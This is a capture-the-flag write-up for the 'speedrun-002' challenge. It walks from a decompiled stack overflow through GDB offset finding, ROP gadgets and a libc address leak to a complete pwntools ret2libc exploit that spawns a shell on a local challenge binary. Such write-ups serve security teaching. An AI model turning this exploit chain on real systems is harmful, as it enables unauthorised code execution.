# &#35; speedrun-002

#### &#42; files
```bash
## 2 files
$ ls
libc-2.27.so	speedrun-002

```

#### &#42; execute
```bash
## just echo
$ ./speedrun-002
We meet again on these pwning streets.
What say you now?
AAAAAAAAAAAA
What a ho-hum thing to say.
Fare thee well.

```

#### &#42; debugging
```bash
void FUN_0040074c(void)
{
  int iVar1;
  char local_598 [400];
  undefined local_408 [1024];
  
  puts("What say you now?");
  read(0,local_598,300);
  iVar1 = strncmp(local_598,"Everything intelligent is so boring.",0x24);
  if (iVar1 == 0) {
    FUN_00400705(local_408);
  }
  else {
    puts("What a ho-hum thing to say.");
  }
  return;
}

## can overflow buf[1024]
## local_408[1024](argv[1]) + rbp + ret
void FUN_00400705(void *param_1)
{
  puts("What an interesting thing to say.\nTell me more.");
  read(0,param_1,0x7da);
  write(1,"Fascinating.\n",0xd);
  return;
}

```


#### &#42; execute again
```bash
## just echo
$ ./speedrun-002
We meet again on these pwning streets.
What say you now?
Everything intelligent is so boring.
What an interesting thing to say.
Tell me more.
AAAAAAAAAAAAAA
Fascinating.
Fare thee well.

```

#### &#42; structure of stack
```bash
buf[1024](argv[1]) + rbp[8] + ret[8]

```

#### &#42; payload(python)
```bash
payload  = "A"*1024
payload += "B"*8
payload += "C"*8

```

#### &#42; check payload(python)
```bash
$ ulimit -c unlimited
$ cyclic 1500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaao

$ gdb ./speedrun-002 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./speedrun-002...
(No debugging symbols found in ./speedrun-002)
gef➤  r
Starting program: /pwn/speedrun-2019/speedrun-002
warning: Error disabling address space randomization: Operation not permitted
We meet again on these pwning streets.
What say you now?
Everything intelligent is so boring.
What an interesting thing to say.
Tell me more.

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaao
Fascinating.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007ba in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xd
$rbx   : 0x0000000000400840  →   push r15
$rcx   : 0x00007f87c82131e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0xd
$rsp   : 0x00007ffeaa4483c8  →  "iaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakua[...]"
$rbp   : 0x6b6161686b616167 ("gaakhaak"?)
$rsi   : 0x0000000000400920  →  "Fascinating.\n"
$rdi   : 0x1
$rip   : 0x00000000004007ba  →   ret
$r8    : 0x30
$r9    : 0x00007f87c8312d50  →   endbr64
$r10   : 0x0000000000400413  →  0x4c47006574697277 ("write"?)
$r11   : 0x246
$r12   : 0x0000000000400600  →   xor ebp, ebp
$r13   : 0x00007ffeaa4484d0  →  "yaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanla[...]"
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffeaa4483c8│+0x0000: "iaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakua[...]"	 ← $rsp
0x00007ffeaa4483d0│+0x0008: "kaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwa[...]"
0x00007ffeaa4483d8│+0x0010: "maaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakya[...]"
0x00007ffeaa4483e0│+0x0018: "oaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalba[...]"
0x00007ffeaa4483e8│+0x0020: "qaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaalda[...]"
0x00007ffeaa4483f0│+0x0028: "saaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfa[...]"
0x00007ffeaa4483f8│+0x0030: "uaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalha[...]"
0x00007ffeaa448400│+0x0038: "waakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaalja[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007b3                  call   0x4005b0 <puts@plt>
     0x4007b8                  nop
     0x4007b9                  leave
 →   0x4007ba                  ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-002", stopped 0x4007ba in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007ba → ret
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  quit

$ cyclic -l gaak
1024

```

#### &#42; struct of bof
```bash
## argv[1][1024] + rbp[8] + ret[8]

```


#### &#42; analysis binary using gdb
```bash
## binary have plt/got function
gdb ./speedrun-002 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./speedrun-002...
(No debugging symbols found in ./speedrun-002)
gef➤ b *0x0040074c	=> main() address in ghidra decompiler
Breakpoint 1 at 0x40074c
gef➤  r
 →   0x40074c                  push   rbp
     0x40074d                  mov    rbp, rsp
     0x400750                  sub    rsp, 0x590
     0x400757                  lea    rdi, [rip+0x1d0]        # 0x40092e
     0x40075e                  call   0x4005b0 <puts@plt>
     0x400763                  lea    rax, [rbp-0x590]
gef➤  

## find puts_plt/got
gef➤  x/2i 0x4005b0
   0x4005b0 <puts@plt>:	jmp    QWORD PTR [rip+0x200a72]        # 0x601028 <puts@got.plt>
   0x4005b6 <puts@plt+6>:	push   0x2
gef➤  x/2i 0x601028
   0x601028 <puts@got.plt>:	movabs al,ds:0xc600007fbb5c9585
   0x601031 <write@got.plt+1>:	add    eax,0x40
gef➤


## find read_plt/got
gef➤  ni
 →   0x400777                  call   0x4005e0 <read@plt>
   ↳    0x4005e0 <read@plt+0>     jmp    QWORD PTR [rip+0x200a5a]        # 0x601040 <read@got.plt>
        0x4005e6 <read@plt+6>     push   0x5
        0x4005eb <read@plt+11>    jmp    0x400580
        0x4005f0 <setvbuf@plt+0>  jmp    QWORD PTR [rip+0x200a52]        # 0x601048 <setvbuf@got.plt>
        0x4005f6 <setvbuf@plt+6>  push   0x6
        0x4005fb <setvbuf@plt+11> jmp    0x400580
gef➤  x/2i 0x4005e0
   0x4005e0 <read@plt>:	jmp    QWORD PTR [rip+0x200a5a]        # 0x601040 <read@got.plt>
   0x4005e6 <read@plt+6>:	push   0x5
gef➤  x/2i 0x601040
   0x601040 <read@got.plt>:	out    0x5,al
   0x601042 <read@got.plt+2>:	add    BYTE PTR [rax],al
gef➤

## find address is below
## puts_plt : 0x4005b0
## puts_got : 0x601028
## read_plt : 0x4005e0
## read_got : 0x601040

gef➤  got
[0x601018] getenv@GLIBC_2.2.5  →  0x7f13aa127020
[0x601020] strncmp@GLIBC_2.2.5  →  0x4005a6
[0x601028] puts@GLIBC_2.2.5  →  0x7f13aa1655a0
[0x601030] write@GLIBC_2.2.5  →  0x4005c6
[0x601038] alarm@GLIBC_2.2.5  →  0x7f13aa1c3f10
[0x601040] read@GLIBC_2.2.5  →  0x7f13aa1ef130
[0x601048] setvbuf@GLIBC_2.2.5  →  0x7f13aa165e60
gef➤


## find gadgets(sys_execve("/bin/sh",0,0)

$ gdb ./speedrun-002 -q
gef➤  ropper --search "pop r?i; ret"
0x00000000004008a3: pop rdi; ret;

gef➤  ropper --search "pop rsi"
0x00000000004008a1: pop rsi; pop r15; ret;

gef➤  ropper --search "pop r?x; ret"
0x00000000004006ec: pop rdx; ret;

gef➤

## doesn't have pop rax; ret gadget.
## thus can't select system call number.

```

#### &#42; using leak puts read got address
#### libc database : <https://libc.blukat.me/>
```bash
## because puts and read functions are used like below
void FUN_0040074c(void)

{
  int iVar1;
  char local_598 [400];
  undefined local_408 [1024];
  
  puts("What say you now?");
  read(0,local_598,300);
  iVar1 = strncmp(local_598,"Everything intelligent is so boring.",0x24);
  if (iVar1 == 0) {
    FUN_00400705(local_408);
  }
  else {
    puts("What a ho-hum thing to say.");
  }
  return;
}


gef➤  b *0x0040074c
Breakpoint 1 at 0x40074c
gef➤  r
.
.
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400749                  nop
     0x40074a                  leave
     0x40074b                  ret
 →   0x40074c                  push   rbp
     0x40074d                  mov    rbp, rsp
     0x400750                  sub    rsp, 0x590
     0x400757                  lea    rdi, [rip+0x1d0]        # 0x40092e
     0x40075e                  call   0x4005b0 <puts@plt>
     0x400763                  lea    rax, [rbp-0x590]

gef➤  x/2i 0x4005b0
   0x4005b0 <puts@plt>:	jmp    QWORD PTR [rip+0x200a72]        # 0x601028 <puts@got.plt>
   0x4005b6 <puts@plt+6>:	push   0x2
gef➤  x/2i 0x601028
   0x601028 <puts@got.plt>:	movabs al,ds:0xc600007f3153c915
   0x601031 <write@got.plt+1>:	add    eax,0x40
gef➤

## puts_plt = 0x4005b0
## puts_got = 0x601028

gef➤ ni
.
.
     0x40076a                  mov    edx, 0x12c
     0x40076f                  mov    rsi, rax
     0x400772                  mov    edi, 0x0
 →   0x400777                  call   0x4005e0 <read@plt>

gef➤  x/2i 0x4005e0
   0x4005e0 <read@plt>:	jmp    QWORD PTR [rip+0x200a5a]        # 0x601040 <read@got.plt>
   0x4005e6 <read@plt+6>:	push   0x5
gef➤  x/2i 0x601040
   0x601040 <read@got.plt>:	out    0x5,al
   0x601042 <read@got.plt+2>:	add    BYTE PTR [rax],al
gef➤

## read_plt = 0x4005e0
## read_got = 0x601040


gef➤  grep "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7f3153da7000-0x7f3153df1000), permission=r--
  0x7f3153dc15aa - 0x7f3153dc15b1  →   "/bin/sh"
gef➤


## struct of leak payload
$ cat exp.py
.
.
payload  = "A"*0x400
payload += "B"*8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

conn.sendline(payload)
conn.recvuntil("Fascinating.\n")

#leak
puts_addr = u64(conn.recv(6).ljust(8, "\x00"))
conn.recvline()
read_addr = u64(conn.recv(6).ljust(8, "\x00"))
log.info("puts_addr : "+hex(puts_addr))
log.info("read_addr : "+hex(read_addr))


$ python exp.py
.
.
[*] puts_addr : 0x7f6008ecc5a0
[*] read_addr : 0x7f6008f56130


## libc database offset
# puts(5a0), read(130)
## Symbol  Offset      Difference
## system  0x055410        -0x32190
## puts    0x0875a0        0x0
## open    0x110e50        0x898b0
## read    0x111130        0x89b90
## write   0x1111d0        0x89c30
## bin_sh  0x1b75aa        0x13000a


```


#### &#42; how to attack
```bash
## leak plt & got of puts/read
## rewind main()
## find offset using libc database
## call system("/bin/sh")

```


#### &#42; make exploit code
```bash
from pwn import *

context.log_level='debug'

conn = process("./speedrun-002")
#elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload  = "Everything intelligent is so boring.\n"
conn.recvuntil("What say you now?")
conn.sendline(payload)

'''
0x00000000004008a3: pop rdi; ret;
0x00000000004008a1: pop rsi; pop r15; ret;
0x00000000004006ec: pop rdx; ret;

## puts_plt : 0x4005b0
## puts_got : 0x601028
## read_plt : 0x4005e0
## read_got : 0x601040

'''
pop_rdi = 0x004008a3
pop_rsi_r15 = 0x004008a1
pop_rdx = 0x004006ec

puts_plt = 0x4005b0
puts_got = 0x601028
read_got = 0x601040
main = 0x004007ce

# leak puts and read address
conn.recvuntil("Tell me more.")
payload  = "A"*0x400
payload += "B"*8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

conn.sendline(payload)
conn.recvuntil("Fascinating.\n")

#leak
puts_addr = u64(conn.recv(6).ljust(8, "\x00"))
conn.recvline()
read_addr = u64(conn.recv(6).ljust(8, "\x00"))
log.info("puts_addr : "+hex(puts_addr))
log.info("read_addr : "+hex(read_addr))

payload  = "Everything intelligent is so boring.\n"
conn.recvuntil("What say you now?")
conn.sendline(payload)

'''
Symbol  Offset      Difference
system  0x055410        -0x32190
puts    0x0875a0        0x0
open    0x110e50        0x898b0
read    0x111130        0x89b90
write   0x1111d0        0x89c30
bin_sh  0x1b75aa        0x13000a
'''

binsh = puts_addr+0x13000a
system = puts_addr-0x32190

payload = "A"*0x400
payload +="B"*8
payload +=p64(pop_rdi)
payload +=p64(binsh)
payload +=p64(system)

conn.sendline(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python exp-speedrun-002.py
[+] Starting local process './speedrun-002' argv=['./speedrun-002'] : pid 1159
[DEBUG] Received 0x39 bytes:
    'We meet again on these pwning streets.\n'
    'What say you now?\n'
[DEBUG] Sent 0x26 bytes:
    'Everything intelligent is so boring.\n'
    '\n'
[DEBUG] Received 0x30 bytes:
    'What an interesting thing to say.\n'
    'Tell me more.\n'
[DEBUG] Sent 0x441 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  42 42 42 42  42 42 42 42  a3 08 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000410  28 10 60 00  00 00 00 00  b0 05 40 00  00 00 00 00  │(·`·│····│··@·│····│
    00000420  a3 08 40 00  00 00 00 00  40 10 60 00  00 00 00 00  │··@·│····│@·`·│····│
    00000430  b0 05 40 00  00 00 00 00  ce 07 40 00  00 00 00 00  │··@·│····│··@·│····│
    00000440  0a                                                  │·│
    00000441
[DEBUG] Received 0x54 bytes:
    00000000  46 61 73 63  69 6e 61 74  69 6e 67 2e  0a a0 d5 56  │Fasc│inat│ing.│···V│
    00000010  79 61 7f 0a  30 71 5f 79  61 7f 0a 57  65 20 6d 65  │ya··│0q_y│a··W│e me│
    00000020  65 74 20 61  67 61 69 6e  20 6f 6e 20  74 68 65 73  │et a│gain│ on │thes│
    00000030  65 20 70 77  6e 69 6e 67  20 73 74 72  65 65 74 73  │e pw│ning│ str│eets│
    00000040  2e 0a 57 68  61 74 20 73  61 79 20 79  6f 75 20 6e  │.·Wh│at s│ay y│ou n│
    00000050  6f 77 3f 0a                                         │ow?·│
    00000054
[*] puts_addr : 0x7f617956d5a0
[*] read_addr : 0x7f61795f7130
[DEBUG] Sent 0x26 bytes:
    'Everything intelligent is so boring.\n'
    '\n'
[DEBUG] Sent 0x421 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  42 42 42 42  42 42 42 42  a3 08 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000410  aa d5 69 79  61 7f 00 00  10 b4 53 79  61 7f 00 00  │··iy│a···│··Sy│a···│
    00000420  0a                                                  │·│
    00000421
[*] Switching to interactive mode

[DEBUG] Received 0x3d bytes:
    'What an interesting thing to say.\n'
    'Tell me more.\n'
    'Fascinating.\n'
What an interesting thing to say.
Tell me more.
Fascinating.
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x1b bytes:
    'getted flag successully!!!\n'
getted flag successully!!!
[*] Got EOF while reading in interactive
$
```